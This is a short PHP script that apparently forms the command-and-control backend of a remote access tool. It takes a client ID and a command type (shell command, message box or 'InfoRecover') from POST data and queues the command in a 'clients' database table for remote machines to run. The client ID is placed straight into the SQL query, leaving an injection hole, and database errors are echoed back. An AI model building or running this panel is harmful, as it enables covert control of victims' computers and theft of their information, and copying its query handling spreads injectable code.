<?php
	function SafeStr($string){
		return strtr( $string, array(  "\n" => " ",  "\r" => "" , "'" => "", "\\" => "", "\"" => "", "," => "..."));
	}
	if (!isset($_POST['CMDType']) || !isset($_POST['ClientID'])){
		echo 'error no : ClientID || CMDType' ;
		die();
	}else {
		$CMDType = $_POST['CMDType'];
		$ClientID = $_POST['ClientID'];
	}
	if (isset($_POST['MssageIcon'])){
		$MssageIcon = $_POST['MssageIcon'];
	}else{
		$MssageIcon = '0';
	}
	if (isset($_POST['MsgType'])){
		$MsgType = $_POST['MsgType'];
	}else{
		$MsgType = '1';
	}
	
	$Msg = SafeStr($_POST['MainShit']);
	
	switch ($CMDType) {
		case 'CMD' :
			$Data =  "{'Status': 0, 'Command':'" .$Msg."'}";
			break;
		case 'MessageBox' : 
			$Data = "{'Status': 0, 'Command':'MsgBox " .$MsgType . ',' . $MssageIcon .','. $Msg."'}";
			break;
		case 'InfoRecover' :
			$Data = "{'Status': 0, 'Command':'".$Msg."'}";
			break;
	}
	
	echo ("update clients set CMD = \"".$Data."\" WHERE ID='".$ClientID."'");
	
	echo ('sending to DB : '.$Data);
	
	/*---------------------------- Update DB ---------------------------------*/
	include('../Config.php');
	try
	{
		$bdd = new PDO('mysql:host='.$DB_Cfg_Host.';dbname='.$DB_Cfg_Name.';charset=utf8', $DB_Cfg_Username, $DB_Cfg_Password);
		array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION);
	}
	catch (Exception $e)
	{
		echo '<script>window.location.href = "..?error=2";</script>';
		die('Erreur : ' . $e->getMessage());
	}
	$reponse = $bdd->query("update clients set CMD = \"".$Data."\" WHERE ID='".$ClientID."'");

	$reponse->closeCursor();
	/*--------------------------------------------------------------------*/
?>